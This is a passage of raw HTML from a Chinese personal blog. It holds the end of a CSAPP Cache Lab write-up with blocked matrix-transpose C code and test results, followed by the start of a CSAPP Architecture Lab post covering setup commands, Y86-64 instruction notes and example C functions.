<span class="number">4</span>];</span><br><span class="line">					x6 = A[k][j + <span class="number">5</span>];</span><br><span class="line">					x7 = A[k][j + <span class="number">6</span>];</span><br><span class="line">					x8 = A[k][j + <span class="number">7</span>];</span><br><span class="line">					</span><br><span class="line">					<span class="comment">// 将 A 的左上行存到 B 的左上列</span></span><br><span class="line">					B[j][k] = x1;</span><br><span class="line">					B[j + <span class="number">1</span>][k] = x2;</span><br><span class="line">					B[j + <span class="number">2</span>][k] = x3;</span><br><span class="line">					B[j + <span class="number">3</span>][k] = x4;</span><br><span class="line">					</span><br><span class="line">                	<span class="comment">// 将 A 的右上行存到 B 的右上列 </span></span><br><span class="line">					B[j][k + <span class="number">4</span>] = x5;</span><br><span class="line">					B[j + <span class="number">1</span>][k + <span class="number">4</span>] = x6;</span><br><span class="line">					B[j + <span class="number">2</span>][k + <span class="number">4</span>] = x7;</span><br><span class="line">					B[j + <span class="number">3</span>][k + <span class="number">4</span>] = x8;</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">            <span class="comment">// 这里需要 k = j，因为要读取 B 的右上行和左下行，他们的横坐标由 j 控制</span></span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> k = j; k &lt; j + <span class="number">4</span>; k++) &#123;	</span><br><span class="line">					</span><br><span class="line">                	<span class="comment">// 读取 A 的左下列</span></span><br><span class="line">					x1 = A[i + <span class="number">4</span>][k];</span><br><span class="line">					x2 = A[i + <span class="number">5</span>][k];</span><br><span class="line">					x3 = A[i + <span class="number">6</span>][k];</span><br><span class="line">					x4 = A[i + <span class="number">7</span>][k];</span><br><span class="line">					</span><br><span class="line">					<span class="comment">// 读取 B 的右上行</span></span><br><span class="line">					x5 = B[k][i + <span class="number">4</span>];</span><br><span class="line">					x6 = B[k][i  +<span class="number">5</span>];</span><br><span class="line">					x7 = B[k][i + <span class="number">6</span>];</span><br><span class="line">					x8 = B[k][i + <span class="number">7</span>];</span><br><span class="line">					</span><br><span class="line">					<span class="comment">// 将 A 的左下列存到 B 的右上行</span></span><br><span class="line">					B[k][i + <span class="number">4</span>] = x1;</span><br><span class="line">					B[k][i + <span class="number">5</span>] = x2;</span><br><span class="line">					B[k][i + <span class="number">6</span>] = x3;</span><br><span class="line">					B[k][i + <span class="number">7</span>] = x4;</span><br><span class="line">					</span><br><span class="line">					<span class="comment">// 将 B 的原右上行存到 B 的左下行</span></span><br><span class="line">					B[k + <span class="number">4</span>][i] = x5;</span><br><span class="line">					B[k + <span class="number">4</span>][i + <span class="number">1</span>] = x6;</span><br><span class="line">					B[k + <span class="number">4</span>][i + <span class="number">2</span>] = x7;</span><br><span class="line">					B[k + <span class="number">4</span>][i + <span class="number">3</span>] = x8;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">// 处理 A 和 B 的右下块</span></span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> k = i; k &lt; i + <span class="number">4</span>; k++) &#123;</span><br><span class="line">				</span><br><span class="line">                <span class="comment">// 读取 A 的右下行</span></span><br><span class="line">				x1 = A[k + <span class="number">4</span>][j + <span class="number">4</span>];</span><br><span class="line">				x2 = A[k + <span class="number">4</span>][j + <span class="number">5</span>];</span><br><span class="line">				x3 = A[k + <span class="number">4</span>][j + <span class="number">6</span>];</span><br><span class="line">				x4 = A[k + <span class="number">4</span>][j + <span class="number">7</span>];</span><br><span class="line">				</span><br><span class="line">				<span class="comment">// 将 A 的右下行存放到 B 的右下列</span></span><br><span class="line">				B[j + <span class="number">4</span>][k + <span class="number">4</span>] = x1;</span><br><span class="line">				B[j + <span class="number">5</span>][k + <span class="number">4</span>] = x2;</span><br><span class="line">				B[j + <span class="number">6</span>][k + <span class="number">4</span>] = x3;</span><br><span class="line">				B[j + <span class="number">7</span>][k + <span class="number">4</span>] = x4;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>通过 <strong>.&#x2F;test-trans -M 64 -N 64</strong>，运行结果如下</li>
</ul>
<img src="/2024/03/22/CSAPP-Lab5/image-20240326155210874.png" class="" title="image-20240326155210874">

<ul>
<li>缓存未命中次数来到了 1179，满分！！！</li>
</ul>
<h2 id="61-67"><a href="#61-67" class="headerlink" title="61 * 67"></a>61 * 67</h2><ul>
<li>61 * 67 矩阵是一个不规则矩阵，很难找到什么特别的优化方法 ……</li>
<li>我们先使用 “ 万能的 ”  8 * 8 分块，再对它的边边角角进行一些处理，具体实现如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span> &#123;</span><br><span class="line">    <span class="type">int</span> x1, x2, x3, x4, x5, x6, x7, x8;</span><br><span class="line">    <span class="type">int</span> n = N / <span class="number">8</span> * <span class="number">8</span>;</span><br><span class="line">    <span class="type">int</span> m = M / <span class="number">8</span> * <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i += <span class="number">8</span>) &#123;</span><br><span class="line">    	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j += <span class="number">8</span>) &#123;</span><br><span class="line">    	    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">8</span>; k++) &#123;</span><br><span class="line">	    	    x1 = A[k + i][j];</span><br><span class="line">	    	    x2 = A[k + i][j + <span class="number">1</span>];</span><br><span class="line">	    	    x3 = A[k + i][j + <span class="number">2</span>];</span><br><span class="line">	    	    x4 = A[k + i][j + <span class="number">3</span>];</span><br><span class="line">	    	    x5 = A[k + i][j + <span class="number">4</span>];</span><br><span class="line">	    	    x6 = A[k + i][j + <span class="number">5</span>];</span><br><span class="line">	    	    x7 = A[k + i][j + <span class="number">6</span>];</span><br><span class="line">	    	    x8 = A[k + i][j + <span class="number">7</span>];</span><br><span class="line">	    	    </span><br><span class="line">	    	    B[j][k + i] = x1;</span><br><span class="line">	    	    B[j + <span class="number">1</span>][k + i] = x2;</span><br><span class="line">	    	    B[j + <span class="number">2</span>][k + i] = x3;</span><br><span class="line">	    	    B[j + <span class="number">3</span>][k + i] = x4;</span><br><span class="line">	    	    B[j + <span class="number">4</span>][k + i] = x5;</span><br><span class="line">	    	    B[j + <span class="number">5</span>][k + i] = x6;</span><br><span class="line">	    	    B[j + <span class="number">6</span>][k + i] = x7;</span><br><span class="line">	    	    B[j + <span class="number">7</span>][k + i] = x8;</span><br><span class="line">    	    &#125;</span><br><span class="line">    	&#125; </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">    	<span class="keyword">for</span> (<span class="type">int</span> j = m; j &lt; M; j++) &#123;</span><br><span class="line">    		B[j][i] = A[i][j];</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = n; i &lt; N; i++) &#123;</span><br><span class="line">    	<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">    		B[j][i] = A[i][j];</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>通过 <strong>.&#x2F;test-trans -M 61 -N 67</strong>，运行结果如下</li>
</ul>
<img src="/2024/03/22/CSAPP-Lab5/image-20240326155825011.png" class="" title="image-20240326155825011">

<ul>
<li><p>缓存未命中次数来到了 2079，差一点满分，这我忍得了吗！</p>
</li>
<li><p>接下来我尝试了多种分块方法，最终在 16 * 16 分块的情况下得到了满分！</p>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span> &#123;</span><br><span class="line">	<span class="meta">#<span class="keyword">define</span> ex 16</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i += ex) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; M; j += ex) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> k = i; k &lt; N &amp;&amp; k &lt; i + ex; k++) &#123;</span><br><span class="line">				<span class="keyword">for</span> (<span class="type">int</span> s = j; s &lt; M &amp;&amp; s &lt; j + ex; s++) &#123;</span><br><span class="line">					B[s][k] = A[k][s];</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>通过 <strong>.&#x2F;test-trans -M 61 -N 67</strong>，运行结果如下</li>
</ul>
<img src="/2024/03/22/CSAPP-Lab5/image-20240326160516439.png" class="" title="image-20240326160516439">

<ul>
<li>擦线通过！太不容易了</li>
</ul>
<h2 id="Result-1"><a href="#Result-1" class="headerlink" title="Result"></a>Result</h2><ul>
<li>整理过后，Part B 的实现代码如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">transpose_submit</span><span class="params">(<span class="type">int</span> M, <span class="type">int</span> N, <span class="type">int</span> A[N][M], <span class="type">int</span> B[M][N])</span> &#123;</span><br><span class="line">	<span class="meta">#<span class="keyword">define</span> ex 16</span></span><br><span class="line">	<span class="type">int</span> x1, x2, x3, x4, x5, x6, x7, x8;</span><br><span class="line">	<span class="keyword">if</span> (M == <span class="number">32</span>) &#123;</span><br><span class="line">		</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>) &#123;</span><br><span class="line">    			<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; M; j += <span class="number">8</span>) &#123;</span><br><span class="line">    	    			<span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">8</span>; k++) &#123;</span><br><span class="line">			    	    x1 = A[k + i][j];</span><br><span class="line">			    	    x2 = A[k + i][j + <span class="number">1</span>];</span><br><span class="line">			    	    x3 = A[k + i][j + <span class="number">2</span>];</span><br><span class="line">			    	    x4 = A[k + i][j + <span class="number">3</span>];</span><br><span class="line">			    	    x5 = A[k + i][j + <span class="number">4</span>];</span><br><span class="line">			    	    x6 = A[k + i][j + <span class="number">5</span>];</span><br><span class="line">			    	    x7 = A[k + i][j + <span class="number">6</span>];</span><br><span class="line">			    	    x8 = A[k + i][j + <span class="number">7</span>];</span><br><span class="line">			    	    </span><br><span class="line">			    	    B[j][k + i] = x1;</span><br><span class="line">			    	    B[j + <span class="number">1</span>][k + i] = x2;</span><br><span class="line">			    	    B[j + <span class="number">2</span>][k + i] = x3;</span><br><span class="line">			    	    B[j + <span class="number">3</span>][k + i] = x4;</span><br><span class="line">			    	    B[j + <span class="number">4</span>][k + i] = x5;</span><br><span class="line">			    	    B[j + <span class="number">5</span>][k + i] = x6;</span><br><span class="line">			    	    B[j + <span class="number">6</span>][k + i] = x7;</span><br><span class="line">			    	    B[j + <span class="number">7</span>][k + i] = x8;</span><br><span class="line">    	    			&#125;</span><br><span class="line">    			&#125; </span><br><span class="line">    		&#125;</span><br><span class="line">	</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (M == <span class="number">64</span>) &#123;</span><br><span class="line">		</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; M; j += <span class="number">8</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = i; k &lt; i + <span class="number">4</span>; k++) &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 读取 A 的左上行</span></span><br><span class="line">                        x1 = A[k][j];				</span><br><span class="line">                        x2 = A[k][j + <span class="number">1</span>];			</span><br><span class="line">                        x3 = A[k][j + <span class="number">2</span>];</span><br><span class="line">                        x4 = A[k][j + <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 读取 A 的右上行</span></span><br><span class="line">                        x5 = A[k][j + <span class="number">4</span>];</span><br><span class="line">                        x6 = A[k][j + <span class="number">5</span>];</span><br><span class="line">                        x7 = A[k][j + <span class="number">6</span>];</span><br><span class="line">                        x8 = A[k][j + <span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 将 A 的左上行存到 B 的左上列</span></span><br><span class="line">                        B[j][k] = x1;</span><br><span class="line">                        B[j + <span class="number">1</span>][k] = x2;</span><br><span class="line">                        B[j + <span class="number">2</span>][k] = x3;</span><br><span class="line">                        B[j + <span class="number">3</span>][k] = x4;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 将 A 的右上行存到 B 的右上列 </span></span><br><span class="line">                        B[j][k + <span class="number">4</span>] = x5;</span><br><span class="line">                        B[j + <span class="number">1</span>][k + <span class="number">4</span>] = x6;</span><br><span class="line">                        B[j + <span class="number">2</span>][k + <span class="number">4</span>] = x7;</span><br><span class="line">                        B[j + <span class="number">3</span>][k + <span class="number">4</span>] = x8;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 这里需要 k = j，因为要读取 B 的右上行和左下行，他们的横坐标由 j 控制</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = j; k &lt; j + <span class="number">4</span>; k++) &#123;	</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 读取 A 的左下列</span></span><br><span class="line">                        x1 = A[i + <span class="number">4</span>][k];</span><br><span class="line">                        x2 = A[i + <span class="number">5</span>][k];</span><br><span class="line">                        x3 = A[i + <span class="number">6</span>][k];</span><br><span class="line">                        x4 = A[i + <span class="number">7</span>][k];</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 读取 B 的右上行</span></span><br><span class="line">                        x5 = B[k][i + <span class="number">4</span>];</span><br><span class="line">                        x6 = B[k][i  +<span class="number">5</span>];</span><br><span class="line">                        x7 = B[k][i + <span class="number">6</span>];</span><br><span class="line">                        x8 = B[k][i + <span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 将 A 的左下列存到 B 的右上行</span></span><br><span class="line">                        B[k][i + <span class="number">4</span>] = x1;</span><br><span class="line">                        B[k][i + <span class="number">5</span>] = x2;</span><br><span class="line">                        B[k][i + <span class="number">6</span>] = x3;</span><br><span class="line">                        B[k][i + <span class="number">7</span>] = x4;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 将 B 的原右上行存到 B 的左下行</span></span><br><span class="line">                        B[k + <span class="number">4</span>][i] = x5;</span><br><span class="line">                        B[k + <span class="number">4</span>][i + <span class="number">1</span>] = x6;</span><br><span class="line">                        B[k + <span class="number">4</span>][i + <span class="number">2</span>] = x7;</span><br><span class="line">                        B[k + <span class="number">4</span>][i + <span class="number">3</span>] = x8;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 处理 A 和 B 的右下块</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = i; k &lt; i + <span class="number">4</span>; k++) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 读取 A 的右下行</span></span><br><span class="line">                    x1 = A[k + <span class="number">4</span>][j + <span class="number">4</span>];</span><br><span class="line">                    x2 = A[k + <span class="number">4</span>][j + <span class="number">5</span>];</span><br><span class="line">                    x3 = A[k + <span class="number">4</span>][j + <span class="number">6</span>];</span><br><span class="line">                    x4 = A[k + <span class="number">4</span>][j + <span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 将 A 的右下行存放到 B 的右下列</span></span><br><span class="line">                    B[j + <span class="number">4</span>][k + <span class="number">4</span>] = x1;</span><br><span class="line">                    B[j + <span class="number">5</span>][k + <span class="number">4</span>] = x2;</span><br><span class="line">                    B[j + <span class="number">6</span>][k + <span class="number">4</span>] = x3;</span><br><span class="line">                    B[j + <span class="number">7</span>][k + <span class="number">4</span>] = x4;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">	</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i += ex) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; M; j += ex) &#123;</span><br><span class="line">				<span class="keyword">for</span> (<span class="type">int</span> k = i; k &lt; N &amp;&amp; k &lt; i + ex; k++) &#123;</span><br><span class="line">					<span class="keyword">for</span> (<span class="type">int</span> s = j; s &lt; M &amp;&amp; s &lt; j + ex; s++) &#123;</span><br><span class="line">						B[s][k] = A[k][s];</span><br><span class="line">					&#125;</span><br><span class="line">				&#125; </span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
<li>当我们第一次通过 <strong>.&#x2F;test-trans -M 32 -N 32</strong> 运行程序时，可能发生 <strong>valgrind: not found</strong>，这说明我们没有安装 valgrind</li>
<li>通过 <strong>sudo apt-get update   sudo apt-get install valgrind</strong> 进行安装（Ubuntu）</li>
<li>讲义中提到我们可以通过 <strong>.&#x2F;driver.py</strong> 对我们的代码进行整体评估，但运行后会发生错误</li>
</ul>
<img src="/2024/03/22/CSAPP-Lab5/image-20240326161646360.png" class="" title="image-20240326161646360">

<ul>
<li>这是由于 driver.py 这个程序是用 pytho2 写的，而在 python3 中，print 函数的语法发生了变化，在 python3 环境下运行它造成语法错误</li>
</ul>
<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/484657229">CSAPP | Lab5-Cache Lab 深入解析 - 知乎 (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/79058089">CSAPP实验之cache lab - 知乎 (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/456858668">CSAPP: Cachelab全注释+思路和建议 - 知乎 (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/28585726">CS:APP配套实验4：Cache Lab笔记 - 知乎 (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xbb224007/article/details/81103995">深入理解计算机系统-cachelab_.&#x2F;csim -v -s 4 -e 1 -b 4 -t traces&#x2F;yi.trace-CSDN博客</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yiweiboi.github.io/2024/03/16/CSAPP-Lab4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yiweiBoi">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/03/16/CSAPP-Lab4/" class="post-title-link" itemprop="url">CSAPP ArchLab</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-03-16 15:36:09" itemprop="dateCreated datePublished" datetime="2024-03-16T15:36:09+08:00">2024-03-16</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-03-27 15:44:06" itemprop="dateModified" datetime="2024-03-27T15:44:06+08:00">2024-03-27</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul>
<li><p>实验开始前请阅读：<a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/3e/archlab.pdf">archlab.pdf (cmu.edu)</a></p>
</li>
<li><p>实验分为三个部分</p>
</li>
<li><p>在 A 部分中，您将编写一些简单的 Y86-64 程序并熟悉 Y86-64 工具</p>
</li>
<li><p>在 B 部分中，您将使用新指令扩展 SEQ 仿真器</p>
</li>
<li><p>这两部分将为您准备 C 部分，即实验室的核心，您将在其中优化 Y86-64 基准测试程序和处理器设计</p>
</li>
<li><p>当按照讲义说明在 sim 目录下通过命令 <strong>make clean; clean</strong> 构建 Y86-64 工具时，可能出现错误，请分别输入以下命令下载相关依赖</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install tcl tcl-dev tk tk-dev</span><br><span class="line">sudo apt install flex</span><br><span class="line">sudo apt install bison</span><br></pre></td></tr></table></figure>

<ul>
<li><p>回忆一下 Y86-64 指令的一些细节</p>
<ul>
<li><p><code>irmovq、rrmovq、mrmovq、rmmovq </code> 前两个字母分别指示源和目的，i 立即数、r 寄存器、m 内存</p>
<blockquote>
<p>内存引用方式只支持基址和偏移量的形式</p>
</blockquote>
</li>
<li><p><code>addq、subq、xorq</code> 只能对寄存器操作，只有它们会设置条件码</p>
</li>
<li><p><code>jmp、jle、jl、je、jne、jge、jg</code> 和 x86-64 一样</p>
</li>
<li><p><code>cmovle、comvl、cmove、cmovne、cmovge、cmovg</code> 条件跳转指令</p>
</li>
<li><p><code>pushq、popq</code> 和 x86-64 一样</p>
</li>
<li><p><code>halt</code> 停止指令的执行</p>
</li>
</ul>
</li>
</ul>
<h1 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h1><ul>
<li>在这一部分中，您将在目录 <strong>sim&#x2F;misc</strong> 中工作。您的任务是编写和模拟以下三个 Y86-64 程序，这些程序的所需行为由 examples.c 中的示例 C 函数定义</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Architecture Lab: Part A </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * High level specs for the functions that the students will rewrite</span></span><br><span class="line"><span class="comment"> * in Y86-64 assembly language</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* $begin examples */</span></span><br><span class="line"><span class="comment">/* linked list element */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ELE</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> val;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ELE</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; *list_ptr;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* sum_list - Sum the elements of a linked list */</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">sum_list</span><span class="params">(list_ptr ls)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> val = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (ls) &#123;</span><br><span class="line">	val += ls-&gt;val;</span><br><span class="line">	ls = ls-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* rsum_list - Recursive version of sum_list */</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">rsum_list</span><span class="params">(list_ptr ls)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (!ls)</span><br><span class="line">	<span 